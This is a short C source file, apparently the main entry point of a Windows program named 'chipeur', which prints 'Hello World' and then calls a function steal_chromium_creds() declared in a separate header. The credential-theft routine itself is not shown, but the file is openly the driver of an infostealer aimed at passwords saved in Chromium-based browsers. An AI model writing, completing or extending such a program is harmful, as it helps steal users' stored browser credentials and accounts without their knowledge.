#include "chipeur.h"

#include <stdio.h>
#include <stdlib.h>
#include <windows.h>

#include "chromium.h"

void hello(void) { printf("Hello World\n"); }

int main(void) {
  // Puts the console in UTF-8
  // Allows us to print non-ASCII characters for debug
  SetConsoleOutputCP(CP_UTF8);

  hello();
  steal_chromium_creds();

  return EXIT_SUCCESS;
}
